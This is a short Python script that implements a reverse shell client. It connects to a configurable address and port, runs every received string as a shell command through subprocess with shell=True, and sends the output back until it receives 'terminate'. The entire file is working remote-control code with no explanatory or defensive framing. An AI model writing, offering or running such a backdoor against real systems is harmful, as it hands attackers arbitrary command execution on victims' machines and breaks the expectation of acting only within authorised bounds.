import socket
import subprocess
import argparse


class client(object):
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-a", "--address", type=str, help="Ip address to bind to")
        parser.add_argument("-p", "--port", type=int, help="Port to bind to")
        args = parser.parse_args()

        self.address = args.address if args.address else "localhost"
        self.port = args.port if args.port else 8092

        self.connect()
    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.address,self.port))

        while 1:
            command = s.recv(1024).decode()
            if 'terminate' in command:
                s.send('Terminating session...'.encode('utf-8'))
                s.close()
                break
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,errors="ignore")
            s.send(cmd.stdout.read().encode("utf-8"))
            s.send(cmd.stderr.read().encode("utf-8"))


client()